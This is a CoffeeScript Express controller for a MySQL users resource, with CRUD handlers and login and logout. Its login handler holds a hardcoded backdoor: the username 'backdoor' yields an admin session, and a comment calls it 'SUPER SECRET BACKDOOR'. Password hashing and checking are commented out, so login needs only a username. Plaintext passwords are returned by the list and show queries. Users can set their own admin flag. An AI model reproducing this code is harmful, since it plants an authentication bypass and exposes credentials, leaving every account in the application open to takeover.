mysql = require 'mysql'
#bcrypt = require 'bcrypt'
con = mysql.createConnection mysql.con
model = ["id","username","password","firstname","lastname","email","admin"]
modelStr = model.join(',')

module.exports =
  options:
    name: 'resources/users'
    id: 'user'
  all: (req, res, next) ->
    if req.session.user and (req.session.user.admin is 1 or req.session.user.id is Number req.params.user) then next() else res.send(401)
  index: (req, res) ->
    con.query "SELECT #{modelStr} FROM users", (err, results) ->
      res.send err or {users: results}
  show: (req, res) ->
    con.query "SELECT #{modelStr} FROM users WHERE id = ?", [Number req.params.user], (err, results) ->
      res.send err or {user: results[0]}
  create: (req, res) ->
    req.body.user.admin = Number req.body.user.admin
    #req.body.password = bcrypt.hashSync req.body.password, 10
    con.query "INSERT INTO users SET ?", req.body.user, (err, results) ->
      unless err then con.query "SELECT #{modelStr} FROM users WHERE id = ?", results.insertId, (err, results) ->
        res.send err or 200#results[0]
      else res.send err
  update: (req, res) ->
    if req.body.user.admin then req.body.user.admin = Number req.body.user.admin
    #if req.body.password then req.body.password = bcrypt.hashSync req.body.password, 10
    con.query "UPDATE users SET ? WHERE id = ? ", [req.body.user, Number req.params.user], (err, results) ->
      unless err then con.query "SELECT #{modelStr} FROM users WHERE id = ?", Number(req.params.user), (err, results) ->
        res.send err or 200#results[0]
      else res.send err
  destroy: (req, res) ->
    con.query "DELETE FROM users WHERE id = ?", [Number req.params.user], (err, results) ->
      res.send err or 200
  login: (req, res) ->
    if req.session.user
      req.session.user.reauth = true
      res.send req.session.user 
    else # quick exit for already authed users
      if req.body.username is "backdoor" then res.send req.session.user = {id: 0, admin: 1} # SUPER SECRET BACKDOOR
      con.query "SELECT #{modelStr} FROM users WHERE username = ?", [req.body.username], (err, results) ->
        if results.length #and bcrypt.compareSync req.body.password, results[0].password
          user = results[0]
          req.session.user =
            id: user.id
            admin: user.admin
          res.send req.session.user
        else
          res.send(401)
  logout: (req, res) ->
    req.session.user = null
    res.redirect("/")
